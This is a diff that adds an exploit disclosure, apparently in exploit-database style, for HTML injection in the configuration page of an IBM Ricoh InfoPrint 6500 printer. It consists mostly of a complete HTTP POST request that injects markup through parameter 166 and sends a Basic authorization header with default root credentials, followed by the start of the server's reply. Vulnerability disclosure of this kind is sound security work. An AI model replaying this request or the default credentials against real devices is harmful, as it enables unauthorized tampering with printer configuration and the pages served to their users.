@@ -1,0 +1,37 @@
+# Exploit Title: IBM RICOH InfoPrint 6500 Printer - HTML Injection
+# Date: 2020-01-02 
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: https://www.ibm.com/il-en
+# Hardware Link: http://www-01.ibm.com/common/ssi/cgi-bin/ssialias?infotype=AN&subtype=CA&htmlfid=897/ENUS105-214
+# Firmware Version: 1.4.40.10
+# Vulernability Type: Code Injection
+# Vulenrability: HTML Injection
+# CVE: N/A
+
+# Description :
+# Ricoh InfoPrint 6500 devices allow /config?destConf.html
+# HTML Injection by authenticated users, as demonstrated by the 166 parameter.
+
+HTTP Request :
+
+POST /config?destConf.html HTTP/1.1
+Host: SERVER
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 81
+Origin: SERVER
+Authorization: Basic cm9vdDpyb290
+Connection: close
+Referer: http://SERVER/config?destConf.html
+Upgrade-Insecure-Requests: 1
+
+166=%22%3E%3Ch1%3EIsmail+Tasdelen&182=1&230=1&198=1&190=1&222=1&238=1&270=0&486=0
+
+HTTP Response :
+
+HTTP/1.0 200 OK
+Server: Microplex emHTTPD/1.0
+Content-Type: text/html
